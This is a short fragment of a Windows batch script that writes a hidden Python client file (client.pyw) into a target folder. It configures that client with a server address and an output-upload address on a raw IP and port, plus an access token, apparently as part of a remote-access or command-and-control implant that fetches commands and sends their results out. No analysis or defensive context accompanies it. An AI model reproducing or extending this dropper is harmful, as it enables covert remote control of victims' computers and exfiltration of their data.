...
echo URL = "http://74.33.102.98:44444/YeahItsAustin" >> "%TARGET_DIR%\client.pyw"
echo OUTPUT_URL = "http://74.33.102.98:44444/output/YeahItsAustin" >> "%TARGET_DIR%\client.pyw"
echo TOKEN = "927772007741927464" >> "%TARGET_DIR%\client.pyw"
